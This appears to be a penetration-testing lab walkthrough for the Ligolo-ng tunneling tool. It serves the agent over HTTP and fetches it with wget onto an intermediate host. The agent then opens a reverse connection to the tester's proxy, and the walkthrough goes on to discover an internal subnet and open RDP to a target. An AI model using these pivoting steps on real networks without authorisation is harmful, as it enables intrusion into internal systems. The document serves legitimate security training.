### **Ligolo-ng Overview and Usage Guide**

**Ligolo-ng** is a **simple**, **lightweight**, and **fast** tunneling tool designed for penetration testers. It enables the creation of tunnels over reverse TCP/TLS connections using a **TUN interface** — eliminating the need for a SOCKS proxy.

🔗 GitHub Repo: https://github.com/nicocha30/ligolo-ng

📦 Download Server (Proxy) and Agent: [Ligolo-ng v0.8 Releases](https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8)

Lab Setup:

![image](https://github.com/user-attachments/assets/d4cb2435-9821-45da-bc24-c080fee8f780)


--
### 🖥️ **Running the Ligolo-ng Server (Proxy)**

1. **Unzip the downloaded release.**
2. **Run the proxy with a self-signed certificate:**

```jsx
./proxy --selfcert
```

![image](https://github.com/user-attachments/assets/dff88f9e-c4e2-4484-8636-91f21e4e7cbd)


### 🌐 **Serving the Agent to the Intermediate Machine**

1. **Start a simple HTTP server on your local machine to serve the agent file:**

```jsx
python -m http.server --bind 192.168.188.130 8888
```

![image](https://github.com/user-attachments/assets/c073ea31-ff61-4077-ba06-5dacf381a8b8)


### 📥 **Deploy the Agent to the Intermediate Machine**

1. **SSH into the intermediate machine:**
2. Download the agent file via `wget`:

```jsx
ssh [shankar@192.168.188.135](mailto:shankar@192.168.188.135)
wget http://192.168.188.130:8888/agent
```

![image](https://github.com/user-attachments/assets/f03ed78c-e65b-40e4-bc0e-c4f821074315)


### ▶️ **Running the Agent**

1. **Make the agent executable and run it:**

```jsx
chmod +x agent
./agent --connect 192.168.188.130:11601 -ignore-cert
```

![image](https://github.com/user-attachments/assets/e6dadf33-a4ec-4d40-aaf3-addb727f4837)


### 🧭 **Network Discovery**

1. **Check the IP address of the intermediate machine:**

```jsx
ifconfig
```

![image](https://github.com/user-attachments/assets/27d93758-dbeb-4820-910a-8009d83036c8)


2. Enumerate the target network (e.g., `192.168.11.0/24`):

```jsx
sudo netdiscover -i ens37 -r 192.168.11.0/24
```

![image](https://github.com/user-attachments/assets/3cf76d44-6393-4a7b-b209-bf5ec7179570)


### 🖥️ **Remote Desktop to the Target**

1. **Use Remmina (or any RDP client) to connect to the target system:**

```jsx
remmina -c rdp://john@192.168.11.131
```

![image](https://github.com/user-attachments/assets/1e54e495-83b1-4df5-9763-8a762b9d9083)

issue : 

error: unable to start tunnel: file exists

<img width="972" height="574" alt="image" src="https://github.com/user-attachments/assets/2e69bf38-e568-4751-b2b9-5150ef19c386" />


    ip link show

    sudo ip link delete <Interface name>
